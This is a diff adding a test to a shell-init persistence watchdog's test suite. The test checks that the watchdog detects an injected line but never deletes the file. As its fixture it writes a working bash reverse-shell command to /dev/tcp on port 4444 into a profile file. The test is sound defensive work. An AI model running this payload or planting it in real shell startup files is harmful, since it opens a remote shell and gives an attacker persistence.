@@ -340,3 +340,26 @@ seed_benign() {
     bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
     [ -z "${bad}" ]
 }
+
+@test "INVARIANT (no auto-delete: shell-init-watchdog NEVER deletes shell-init files — surveillance not remediation)" {
+    # Sister to brain-wide no-auto-delete / surveillance-not-
+    # remediation INVARIANTs across L2 watchdog suites. The
+    # shell-init-watchdog DETECTS T1546.004 shell-init per-login
+    # source persistence via injection but MUST NEVER emit rm/
+    # unlink commands to auto-clean the file. The detected
+    # injection may be operator-legitimate (custom PATH export,
+    # site-specific umask, tooling activation) — silent auto-
+    # delete would destroy operator baseline state AND
+    # forensic evidence chain. Surveillance, never remediation.
+    # Locks anti-data-loss contract on the shell-init
+    # surveillance substrate.
+    seed_benign
+    printf '; bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F}"
+    run_wd
+    # Shell-init file MUST remain on disk after detection.
+    [ -f "${PROFILE_F}" ]
+    # Watchdog source must never emit rm/unlink/find -delete on
+    # shell-init paths.
+    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
+    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(PROFILE_F|PROFILE|SHELL_INIT|FILE|file)' "${WD}"
+}
